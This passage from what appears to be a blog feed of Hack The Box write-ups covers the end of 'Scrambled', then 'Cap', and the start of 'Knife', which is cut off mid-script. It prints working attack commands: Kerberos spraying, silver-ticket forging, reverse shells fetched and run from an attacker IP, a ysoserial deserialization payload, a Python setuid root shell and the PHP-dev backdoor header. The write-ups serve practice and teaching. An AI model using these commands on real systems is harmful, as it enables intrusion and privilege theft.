sk-RC,1D,\"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\")%r(TerminalServer,1D,\"SF:SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\")%r(NCP,1D,\"SCRAMBLECORP_ORDERS_V1\\.0SF:\\.3;\\r\\n\")%r(NotesRPC,1D,\"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\")%r(JavaRMISF:,1D,\"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\")%r(WMSRequest,1D,\"SCRAMBLECORP_SF:ORDERS_V1\\.0\\.3;\\r\\n\")%r(oracle-tns,1D,\"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\rSF:\\n\")%r(ms-sql-s,1D,\"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\")%r(afp,1D,\"SCRAMSF:BLECORP_ORDERS_V1\\.0\\.3;\\r\\n\")%r(giop,1D,\"SCRAMBLECORP_ORDERS_V1\\.0\\.3;SF:\\r\\n\");Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: -3s, deviation: 0s, median: -3s| smb2-time: | date: 2022-09-22T12:00:35|_ start_date: N/A| ms-sql-info: | 10.10.11.168:1433: | Version: | name: Microsoft SQL Server 2019 RTM| number: 15.00.2000.00| Product: Microsoft SQL Server 2019| Service pack level: RTM| Post-SP patches applied: false|_ TCP port: 1433| smb2-security-mode: | 3.1.1: |_ Message signing enabled and requiredService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Thu Sep 22 14:01:17 2022 -- 1 IP address (1 host up) scanned in 197.29 secondsThis machine has plenty of open ports, but some of them attract our attention. We can see that ports 53 (DNS), 88 (Kerberos), 389 (LDAP) and 445 (SMB) are open. These ports are usually open in DCs (Domain Controllers), so we can take a guess. We can also see that port 4411 is not being identified correctly.Additionally, we can see how the LDAP service leaks the scrm.local domain and the dc1.scrm.local FQDN (Fully Qualified Domain Name), which identifies the DC in the domain. We will add the DC's FQDN to our /etc/hosts, so it points to the target machine’s IP.Web ServerThe first port that we will enumerate is the web HTTP server (80), as it usually reveals very useful information and there are plenty of web vulnerabilities.On the root page of the web server, we will find a section called IT Services that contains different articles that describe procedures used in the company. This is very useful information, and sometimes things that seem the most harmless are the ones that provide the most information.We will see the information that we can retrieve from the different articles:News Web ServerThere is an alert on the web server that indicates that the company has been security breached and that the NTLM authentication has been disabled for the internal network. This seems harmless, but it is always a bad practice to reveal any information about how the internal network of a company is set up. In this case, we can take a guess that the authentication is done via Kerberos instead of NTLM in the internal network, so we will have it in mind.User leakIn the next article, we will see a tutorial on how to get network details in order to contact the technical team of the company. This also seems harmless, but if we take a look at the screenshot, we can see that the ksimpson user is being leaked.DC’s FQDN and service port leakIn the last article, we can see the FQDN of the DC and the port that an internal tool is using. If we remember the nmap enumeration, this was the port that was not being identified correctly. We can guess that this is a port used by a custom internal tool.1st Way: Guessing User and PasswordWith all the information we have, we can guess that a potential user of the AD is ksimpson. We can also guess that this user is using a weak password, which is exactly his username.We can validate these credentials with the CrackMapExec tool and using the following command (remember that the SMB port is open and that NTLM authentication has been disabled, so we have to use Kerberos authentication):cme smb 10.10.11.168 -k -u 'ksimpson' -p 'ksimpson'So, just guessing, we will have the following correct credentials:AD -&gt; ksimpson -&gt; ksimpson2nd Way: Kerberos Brute-ForceIf you are not a guess person, you can always brute-force the Kerberos service in order to find users and passwords on the AD.First, we will start enumerating users on the AD. In order to do that, we will use the Kerbrute tool and the xato-net-10-million-usernames.txt wordlist from SecLists:User EnumerationWe will find the following usernames and we will save them in a file named users.txt:ksimpsonadministratorasmithjhallsjenkinskhicksNow, we will try to do a password spraying. We will use the users.txt file for both users and passwords. As the Kerbrute tool only allows testing a single password for a username list, we will use the following for in Bash to fix this problem:for pass in $(cat users.txt); do kerbrute bruteuser -d scrm.local --dc dc1.scrm.local users.txt $pass; done __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,&lt; / __/ / / /_/ / / / /_/ / /_/ __//_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: dev (n/a) - 09/22/22 - Ronnie Flathers @ropnop2022/09/22 17:16:15 &gt; Using KDC(s): [0m2022/09/22 17:16:15 &gt; \tscrambled.htb:882022/09/22 17:16:15 &gt; [+] VALID LOGIN:\t ksimpson@SCRM.LOCAL:ksimpson2022/09/22 17:16:15 &gt; Done! Tested 6 logins (1 successes) in 0.370 seconds __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,&lt; / __/ / / /_/ / / / /_/ / /_/ __//_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: dev (n/a) - 09/22/22 - Ronnie Flathers @ropnop2022/09/22 17:16:15 &gt; Using KDC(s):2022/09/22 17:16:15 &gt; \tscrambled.htb:882022/09/22 17:16:15 &gt; Done! Tested 6 logins (0 successes) in 0.266 seconds __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,&lt; / __/ / / /_/ / / / /_/ / /_/ __//_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: dev (n/a) - 09/22/22 - Ronnie Flathers @ropnop2022/09/22 17:16:15 &gt; Using KDC(s):2022/09/22 17:16:15 &gt; \tscrambled.htb:882022/09/22 17:16:15 &gt; Done! Tested 6 logins (0 successes) in 0.242 seconds __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,&lt; / __/ / / /_/ / / / /_/ / /_/ __//_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: dev (n/a) - 09/22/22 - Ronnie Flathers @ropnop2022/09/22 17:16:15 &gt; Using KDC(s):2022/09/22 17:16:15 &gt; \tscrambled.htb:882022/09/22 17:16:16 &gt; Done! Tested 6 logins (0 successes) in 0.266 seconds __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,&lt; / __/ / / /_/ / / / /_/ / /_/ __//_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: dev (n/a) - 09/22/22 - Ronnie Flathers @ropnop2022/09/22 17:16:16 &gt; Using KDC(s):2022/09/22 17:16:16 &gt; \tscrambled.htb:882022/09/22 17:16:16 &gt; Done! Tested 6 logins (0 successes) in 0.294 seconds __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,&lt; / __/ / / /_/ / / / /_/ / /_/ __//_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: dev (n/a) - 09/22/22 - Ronnie Flathers @ropnop2022/09/22 17:16:16 &gt; Using KDC(s):2022/09/22 17:16:16 &gt; \tscrambled.htb:882022/09/22 17:16:16 &gt; Done! Tested 6 logins (0 successes) in 0.264 secondsWe will find the following valid credentials:AD -&gt; ksimpson -&gt; ksimpsonSMBIf we enumerate the SMB service using impacket-smbclient with the credentials we have just found, we will find the following:SMB ClientWe can see a PDF named Network Security Changes.pdf in the Public share. We will download it and proceed to inspect it:Network Security Changes.pdfThis PDF reveals some useful information. First, we see the same alert that was present on the web server. This alert basically says that the NTLM authentication has been disabled on the network of the company. In the second section of the PDF we can see some very interesting information. This section says that an attacker was able to retrieve credentials from the HR SQL database and that access to the SQL service has been removed for everyone apart from the network administrators. So basically, it is giving us a hint saying that we can find credentials in the SQL database.User ShellWith all the information that we have retrieved in the enumeration phase, we will proceed to try to get a shell from the target machine.Silver Ticket AttackAt this point, we can use the impacket-GetUserSPNs tool to retrieve the SPNs (Service Principal Names) and their associated user accounts. SPNs are unique identifiers of a service instance and they are used by Kerberos to associate a service instance with a service logon account. This tool can also retrieve the TGS (Ticket Granting Service), in a hash format, of the user account associated with a service, and that is what we are going to do now. As we have valid credentials for Kerberos, we can try to retrieve the hash of a user account associated with a SPN:GetUserSPNsWe can see how we have retrieved the hash associated with the SqlSvc user that runs the MSSQLSvc/dc1.scrm.local:1433 SPN. We will crack this hash using John The Ripper and the rockyou.txt wordlist:JTR CrackingWe will find the following valid credentials:AD -&gt; sqlsvc -&gt; Pegasus60It is important to emphasize that these credentials are only going to be useful in their associated service. In this case, the SqlSvc user credentials and the MSSQLSvc/dc1.scrm.local:1433 SPN.With this said, we can try to forge a Silver Ticket from the DC to access the MSSQL service as the SqlSvc user. Silver Tickets are related to Golden Tickets but are more limited in scope. They give attackers access to a single service in an application, instead of all the services in the entire domain, as is the case with Golden Tickets. Once we have a ticket, we can use a technique called PassTheTicket that allows us to login to a service with a ticket instead of using traditional credentials.In order to forge a Silver Ticket, we will first need to retrieve some information from the domain. First, we will use the following command to get the Domain SID (Security Identifier):impacket-getPac -targetUser ksimpson scrm.local/ksimpson:ksimpsonDomain SIDOnce we have the Domain SID, we will convert the password that we have cracked to an NTLM hash using the following command:Password to NTLMNow we have all the information that we need to forge the Silver Ticket. We will use impacket-ticketer in order to do this:impacket-ticketer -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -spn MSSQLSvc/dc1.scrm.local:1433 -domain scrm.local -dc-ip dc1.scrm.local -nthash b999a16500b87d17ec7f2e2a68778f05 AdministratorThis command will generate an Administrator.ccache file that will correspond to our Silver Ticket for the MSSQL service as the SqlSvc user.MSSQLOnce we have the Silver Ticket, we will use the following command to do PassTheTicket and connect to the SQL database of the machine in an interactive session:export KRB5CCACHE=Administrator.ccache; impacket-mssqlclient -k dc1.scrm.localOnce we are connected, we will list the available databases and tables:ScrambleHR Database TablesWe will find an interesting table named UserImport in the ScrambleHR database. If we recall, it is the database where the PDF document stated that the credentials were in. We will enumerate all the columns in this table:Password in TableWe can see how we can find some credentials as stated in the PDF document.AD -&gt; MiscSvc -&gt; ScrambledEggs9900In addition, if we visualize the help panel, we can see that we can activate the xp_cmdshell function. This function allows us to execute cmd commands in the machine hosting the SQL database. We will first activate it and then try the execution of commands:xp_cmdshellReverse ShellsSQLSvcHaving command execution as the sqlsvc user, we will try to send a reverse shell to our machine in order to have a proper shell to operate from.First, we will host the nc64.exe binary with python3 -m http.server and then we will download it to the target machine. Additionally, we will listen on port 443 with rlwrap nc -nlvp 443. Finally, we will send a reverse shell from the target machine to our machine on port 443 with the nc64.exe binary:SQLSvc Reverse ShellWe can see that we have a shell as the sqlsvc user.MiscSvcHaving a shell as the sqlsvc user to operate as well as the credentials for the miscsvc user, we will try to send a reverse shell as the miscsvc user to our machine using the Invoke-PowerShellTcp.ps1 Powershell script from Nishang.First, we will edit the Invoke-PowerShellTcp.ps1 script, and we will add the following command at the end of the script. This will have an advantage as we can run the script directly when it is downloaded without having to download it first and then run it. We will indicate that we want a reverse shell, the IP address of our machine, and the port that we want to use (9000):Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.11 -Port 9000We will host this file with python3 -m http.server.Then, on the target machine, we will execute the following commands in order to create secure PSCredentials with the password that we have retrieved from the database for the miscsvc user:$SecPassword = ConvertTo-SecureString 'ScrambledEggs9900' -AsPlainText -Force$Cred = New-Object System.Management.Automation.PSCredential('Scrm\\MiscSvc', $SecPassword)Last, we will execute the following command in order to download and execute the Invoke-PowerShellTcp.ps1 script as the miscsvc user with the PSCredentials that we have just created. We will be listening in the 9000 port in our machine with rlwrap nc -nlvp 9000 too:Invoke-Command -Computer dc1 -Credential $Cred -ScriptBlock {IEX(New-Object Net.WebClient).downloadString(\"http://10.10.14.11:8000/Invoke-PowerShellTcp.ps1\")}MiscSvc Reverse ShellWe can see that we have a shell as the miscsvc user. Now we can proceed to visualize the user.txt flag in the C:\\Windows\\Users\\miscsvc\\Desktop\\ directory.Administrator ShellNow that we have a shell as the miscsvc user, we will proceed to enumerate the target machine in order to gain Administrator access.EnumerationIt is always important to check the processes that are running on the target machine as they are a very common attack vector in order to gain privileged access. To do this, we will use the following command:Get-ProcessGet-ProcessWe can see a process named ScrambleServer that will attract our attention. If we remember the enumeration phase, there was a client program that was connecting to the DC on port 4411. We can guess that the server behind that client program is this process..Net Reverse EngineeringWe know that there is a process called ScrambleServer, but where is the client for this server that we have seen on the web server? We will enumerate the machine further and we will find the following files:EXE and DLLIf we download the files to our machine and inspect them:File typeWe can see that we have a DLL file and a EXE file, both of them being PE32 executables.We will use ILSpy in order to decompile both files and see how they are built and how they run.If we analyze the code of the binaries, we will find some interesting things in the ScrambleLib.dll binary.Request Type DeclarationWe can see that we have a declaration of an enum object populated with functions, named RequestType.Message Code DeclarationThis object is used when UPLOAD_ORDER is typed in the client application.Insecure Deserialization Vulnerability in the CodeIf we analyze the UploadOrder function, we can see how it calls a function named SerializeToBase64.We will find the following two functions in the SalesOrder class:Insecure Deserialization Vulnerability in the CodeWe can see that these two functions are used to serialize and deserialize data. This type of function should always be reviewed before production because it may pose a security risk. If user data is passed to these functions without being sanitized, it can lead to RCE (Remote Command Execution).In the DeserializeFromBase64 function, the user data is passed to the binaryFormatter.Deserialize function without being sanitized, and this function is called when the user types UPLOAD_ORDER + {PAYLOAD} in the client application. This leads to an Insecure Deserialization vulnerability.Insecure DeserializationIn order to abuse this Insecure Deserialization vulnerability, we can use the ysoserial.net tool. This tool generates a serialized payload that allows you to execute commands when it is deserialized. This tool, in particular, is for .Net applications, but there are similar tools for other programming languages too.We will download the ysoserial.zip and transfer it to the target machine:ysoserial TransferNow we will extract the .zip file with the following command:Expand-Archive ysoserial.zipOnce we have the executable file on the target machine. We can execute it setting the formatter to BinaryFormatter (remember it was the function being used to deserialize), the WindowsIdentity gadget, that we want the payload in Base64 format (remember the deserialize function received a Base64 string) and the command that we want to execute (simple powershell reverse shell with the nc.exe binary we have uploaded previously) :.\\ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c \"C:\\Temp\\nc.exe -e powershell.exe 10.10.14.11 443\"ysoserial PayloadOnce we have the payload generated, we will copy it. Now we will connect via nc to port 4411 on the target machine. Then, we will listen on a port for the reverse shell with rlwrap nc -nlvp 443. Last, we will type the following into the nc connection:UPLOAD_ORDER;{PAYLOAD}System Reverse ShellWe can see how we have a shell as the nt authority\\system user, so we will proceed to visualize the root.txt flag in the C:\\Users\\Administrator\\Desktop directory." }, { "title": "Cap Write-up", "url": "/posts/cap/", "categories": "Hack The Box, Linux", "tags": "htb, linux, pcap, capabilities", "date": "2022-10-03 09:00:00 +0200", "snippet": "EnumerationOS DetectionIn order to identify the machine that we are dealing with, we will perform an OS detection. This can be done very simply, as the TTL (Time To Live) of a ping response can give us clues. TTL will be close to 64 on Unix machines, close to 128 on Windows machines, and close to 255 on Solaris machines.PingWe can see that the machine is a Linux machine.NmapFirst, we will start enumerating the open ports on the victim machine. We will use nmap for that. We will scan the full port range, we will filter for open ports, and we will use the TCP Syn Port Scan. To make the scan faster, we will disable DNS enumeration and host discovery. Lastly, we will export evidence to the allPorts file:nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.10.245# Nmap 7.91 scan initiated Wed Jun 16 15:16:51 2021 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.10.245# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10.10.10.245 ()\tStatus: UpHost: 10.10.10.245 ()\tPorts: 21/open/tcp//ftp///, 22/open/tcp//ssh///, 80/open/tcp//http///# Nmap done at Wed Jun 16 15:17:06 2021 -- 1 IP address (1 host up) scanned in 14.17 secondsOnce we know the open ports, we will scan them in a more exhaustive way to find the services and versions that are running. We will export evidence to the targeted file:nmap -sC -sV -p21,22,80 -oN targeted 10.10.10.245# Nmap 7.91 scan initiated Wed Jun 16 15:17:36 2021 as: nmap -sC -sV -p21,22,80 -oN targeted 10.10.10.245Nmap scan report for 10.10.10.245Host is up (0.15s latency).PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)| 256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)|_ 256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)80/tcp open http gunicorn| fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 404 NOT FOUND| Server: gunicorn| Date: Wed, 16 Jun 2021 13:29:57 GMT| Connection: close| Content-Type: text/html; charset=utf-8| Content-Length: 232| &lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"&gt;| &lt;title&gt;404 Not Found&lt;/title&gt;| &lt;h1&gt;Not Found&lt;/h1&gt;| &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;| GetRequest: | HTTP/1.0 200 OK| Server: gunicorn| Date: Wed, 16 Jun 2021 13:29:51 GMT| Connection: close| Content-Type: text/html; charset=utf-8| Content-Length: 19386| &lt;!DOCTYPE html&gt;| &lt;html class=\"no-js\" lang=\"en\"&gt;| &lt;head&gt;| &lt;meta charset=\"utf-8\"&gt;| &lt;meta http-equiv=\"x-ua-compatible\" content=\"ie=edge\"&gt;| &lt;title&gt;Security Dashboard&lt;/title&gt;| &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt;| &lt;link rel=\"shortcut icon\" type=\"image/png\" href=\"/static/images/icon/favicon.ico\"&gt;| &lt;link rel=\"stylesheet\" href=\"/static/css/bootstrap.min.css\"&gt;| &lt;link rel=\"stylesheet\" href=\"/static/css/font-awesome.min.css\"&gt;| &lt;link rel=\"stylesheet\" href=\"/static/css/themify-icons.css\"&gt;| &lt;link rel=\"stylesheet\" href=\"/static/css/metisMenu.css\"&gt;| &lt;link rel=\"stylesheet\" href=\"/static/css/owl.carousel.min.css\"&gt;| &lt;link rel=\"stylesheet\" href=\"/static/css/slicknav.min.css\"&gt;| &lt;!-- amchar| HTTPOptions: | HTTP/1.0 200 OK| Server: gunicorn| Date: Wed, 16 Jun 2021 13:29:52 GMT| Connection: close| Content-Type: text/html; charset=utf-8| Allow: GET, HEAD, OPTIONS| Content-Length: 0| RTSPRequest: | HTTP/1.1 400 Bad Request| Connection: close| Content-Type: text/html| Content-Length: 196| &lt;html&gt;| &lt;head&gt;| &lt;title&gt;Bad Request&lt;/title&gt;| &lt;/head&gt;| &lt;body&gt;| &lt;h1&gt;&lt;p&gt;Bad Request&lt;/p&gt;&lt;/h1&gt;| Invalid HTTP Version &amp;#x27;Invalid HTTP Version: &amp;#x27;RTSP/1.0&amp;#x27;&amp;#x27;| &lt;/body&gt;|_ &lt;/html&gt;|_http-server-header: gunicorn|_http-title: Security Dashboard1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port80-TCP:V=7.91%I=7%D=6/16%Time=60C9F9F7%P=x86_64-pc-linux-gnu%r(GetRSF:equest,2FE5,\"HTTP/1\\.0\\x20200\\x20OK\\r\\nServer:\\x20gunicorn\\r\\nDate:\\x20SF:Wed,\\x2016\\x20Jun\\x202021\\x2013:29:51\\x20GMT\\r\\nConnection:\\x20close\\r\\SF:nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x20193SF:86\\r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html\\x20class=\\\"no-js\\\"\\x20lang=\\\"en\\\"&gt;\\SF:n\\n&lt;head&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20charset=\\\"utf-8\\\"&gt;\\n\\x20\\x20\\x20\\x2SF:0&lt;meta\\x20http-equiv=\\\"x-ua-compatible\\\"\\x20content=\\\"ie=edge\\\"&gt;\\n\\x20\\SF:x20\\x20\\x20&lt;title&gt;Security\\x20Dashboard&lt;/title&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\SF:x20name=\\\"viewport\\\"\\x20content=\\\"width=device-width,\\x20initial-scale=SF:1\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\\"shortcut\\x20icon\\\"\\x20type=\\\"imageSF:/png\\\"\\x20href=\\\"/static/images/icon/favicon\\.ico\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;SF:link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"/static/css/bootstrap\\.min\\.css\\\"&gt;SF:\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"/static/css/fonSF:t-awesome\\.min\\.css\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\\"stylesheet\\\"\\x20SF:href=\\\"/static/css/themify-icons\\.css\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=SF:\\\"stylesheet\\\"\\x20href=\\\"/static/css/metisMenu\\.css\\\"&gt;\\n\\x20\\x20\\x20\\x2SF:0&lt;link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"/static/css/owl\\.carousel\\.min\\.SF:css\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"/static/cSF:ss/slicknav\\.min\\.css\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;!--\\x20amchar\")%r(HTTPOptionSF:s,B3,\"HTTP/1\\.0\\x20200\\x20OK\\r\\nServer:\\x20gunicorn\\r\\nDate:\\x20Wed,\\x2SF:016\\x20Jun\\x202021\\x2013:29:52\\x20GMT\\r\\nConnection:\\x20close\\r\\nContenSF:t-Type:\\x20text/html;\\x20charset=utf-8\\r\\nAllow:\\x20GET,\\x20HEAD,\\x20OPSF:TIONS\\r\\nContent-Length:\\x200\\r\\n\\r\\n\")%r(RTSPRequest,121,\"HTTP/1\\.1\\x2SF:0400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\nContent-Type:\\x20textSF:/html\\r\\nContent-Length:\\x20196\\r\\n\\r\\n&lt;html&gt;\\n\\x20\\x20&lt;head&gt;\\n\\x20\\x20SF:\\x20\\x20&lt;title&gt;Bad\\x20Request&lt;/title&gt;\\n\\x20\\x20&lt;/head&gt;\\n\\x20\\x20&lt;body&gt;\\SF:n\\x20\\x20\\x20\\x20&lt;h1&gt;&lt;p&gt;Bad\\x20Request&lt;/p&gt;&lt;/h1&gt;\\n\\x20\\x20\\x20\\x20InvaliSF:d\\x20HTTP\\x20Version\\x20&amp;#x27;Invalid\\x20HTTP\\x20Version:\\x20&amp;#x27;RTSPSF:/1\\.0&amp;#x27;&amp;#x27;\\n\\x20\\x20&lt;/body&gt;\\n&lt;/html&gt;\\n\")%r(FourOhFourRequest,189SF:,\"HTTP/1\\.0\\x20404\\x20NOT\\x20FOUND\\r\\nServer:\\x20gunicorn\\r\\nDate:\\x20WSF:ed,\\x2016\\x20Jun\\x202021\\x2013:29:57\\x20GMT\\r\\nConnection:\\x20close\\r\\nSF:Content-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x20232\\SF:r\\n\\r\\n&lt;!DOCTYPE\\x20HTML\\x20PUBLIC\\x20\\\"-//W3C//DTD\\x20HTML\\x203\\.2\\x20SF:Final//EN\\\"&gt;\\n&lt;title&gt;404\\x20Not\\x20Found&lt;/title&gt;\\n&lt;h1&gt;Not\\x20Found&lt;/h1&gt;SF:\\n&lt;p&gt;The\\x20requested\\x20URL\\x20was\\x20not\\x20found\\x20on\\x20the\\x20serSF:ver\\.\\x20If\\x20you\\x20entered\\x20the\\x20URL\\x20manually\\x20please\\x20chSF:eck\\x20your\\x20spelling\\x20and\\x20try\\x20again\\.&lt;/p&gt;\\n\");Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Wed Jun 16 15:19:47 2021 -- 1 IP address (1 host up) scanned in 131.37 secondsWe can see that we have got the 21 (FTP), 22 (SSH) and 80 (HTTP) ports open.Web ServerWe will start by enumerating the web server.This web server will have various sections, but one of them will attract our attention. This section will allow us to download network captures from the target machine:Web Server DashboardWe can see how this section seems to be empty. If we observe the URL of this section:Dashboard URLThis network captures are in the /data/{ID} directory, where {ID} represents the number of the capture. We can see that in this case we are dealing with the 23rd capture.At this point, we will try to enumerate further this network captures. Assuming that the network captures are ordered consecutively and in an ascending way, we will start with the number 0 capture:Dashboard First ObjectWe can see how the number 0 capture does contain data, so we will try to download it.PCAPOnce we download the file, we will see that it is named 0.pcap, so we will inspect it with Wireshark:WiresharkThere are many protocols in this network capture, but one of them is going to attract our attention. This protocol is FTP. As we know, FTP is an unsecure protocol and some of its critical transactions are made in plain text, for example, the authentication process. We will filter by FTP protocol and examine the capture further.FTPWe can see the authentication process in plain text, including the user and password that are used to login:nathan:Buck3tH4TF0RM3!We will try to connect with them to the FTP service:FTPThe directory that is hosted on the FTP server corresponds to the home directory of the nathan user, so we can retrieve the user.txt flag.User ShellSSHAt this point, we have read permissions in the /home/nathan directory of the target machine, but we don’t have a shell.If we remember the enumeration phase, we had the 22 (SSH) port open. Sometimes the FTP and SSH services have the same credentials as the user on the target machine, so we will try to connect to the SSH service with the credentials that we have just found:SSHWe can see how we have a shell as the nathan user using the SSH service.Root ShellEnumerationWe will start to enumerate the target machine in order to elevate our privileges to the root user.CapabilitiesWe can check for capabilities in binaries of the system. Capabilities allow programs to perform certain actions that are only meant for privileged users, even if they are executed by a non-privileged user.In order to list the capabilities of the binaries on the system, we can use the getcap tool:getcap -r / 2&gt;/dev/nullGet CapabilitiesWe can see that the Python3.8 binary has some interesting capabilities. We have the cap_setuid and the cap_net_bind_service capabilities. The first one allows you to change the uid under which the binary runs. The second one lets us bind privileged ports (under 1024).Shell SpawningTo obtain a shell as the root user, we will abuse the cap_setuid capability. This capability will allow us to run Python commands as the root user.We will execute the following command to obtain a shell as the root user:python3.8 -c \"import os; os.setuid(0); os.system('/bin/bash')\"Abuse Python CapabilityOnce we have a shell as the root user, we will proceed to visualize the root.txt flag in the /root directory." }, { "title": "Knife Write-up", "url": "/posts/knife/", "categories": "Hack The Box, Linux", "tags": "htb, linux, php, knife", "date": "2022-09-30 09:00:00 +0200", "snippet": "EnumerationNmapFirst, we will start scanning the target machine. To do this, we will use nmap. The scan will filter the open ports in all the port range and will use the TCP Syn Port Scan. Optionally, we can disable host discovery and DNS resolution to make the scan faster. Last but not least, we export evidence to a file called allPorts:nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.10.242# Nmap 7.91 scan initiated Wed Jun 16 22:08:18 2021 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.10.242# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10.10.10.242 ()\tStatus: UpHost: 10.10.10.242 ()\tPorts: 22/open/tcp//ssh///, 80/open/tcp//http///# Nmap done at Wed Jun 16 22:08:29 2021 -- 1 IP address (1 host up) scanned in 11.69 secondsOnce we know the open ports, we can now do a more exhaustive scan to detect the services running on them and their versions. We will also save evidence in a file called targeted:nmap -sC -sV -p22,80 -oN targeted 10.10.10.242# Nmap 7.91 scan initiated Wed Jun 16 22:09:14 2021 as: nmap -sC -sV -p22,80 -oN targeted 10.10.10.242Nmap scan report for 10.10.10.242Host is up (0.040s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)| 256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)|_ 256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Emergent Medical IdeaService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Wed Jun 16 22:09:22 2021 -- 1 IP address (1 host up) scanned in 8.65 secondsWe can see how that ports are open: 22 (SSH) and 80 (HTTP).WhatWebWe will start by enumerating the web server. With the WhatWeb tool, we can make a first approximation of what technologies the web server is running. To use it:whatweb \"http://10.10.10.242\"http://10.10.10.242 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.42 (Ubuntu)], IP[10.10.10.242], PHP[8.1.0-dev], Script, Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]We can see how the tool displays useful information. First, the server runs Apache 2.4.1 and second, and more importantly, the PHP version that is running is the 8.1.0-dev. This will attract our attention as the PHP version seems to be the dev version. We will explore more about this.User ShellEnumerationWe will try to search if the PHP version that the web server is running is vulnerable. To do this, we will use the Searchsploit tool that allows us to search in the known Exploit-DB from the command line interface:searchsploit php 8.1.0-devsearchsploitIf we analyze this RCE (Remote Command Execution) exploit, we can see how this particular version of PHP was compromised and a backdoor was introduced in the code. The only thing to do in order to exploit the vulnerability is to use the following header in an HTTP request and indicate the system-level command that we want to run:User-Agentt: zerdoiumsystem(whoami);ExploitingTo weaponize this exploit we will create a Python3 script. This script will let us send a reverse shell from the target machine to our machine:#!/usr/bin/python3#coding: utf-8# PHP 8.0.1-dev Backdoor# Author: Gaizka Martin (a.k.a g2jz)import requestsimport syss = 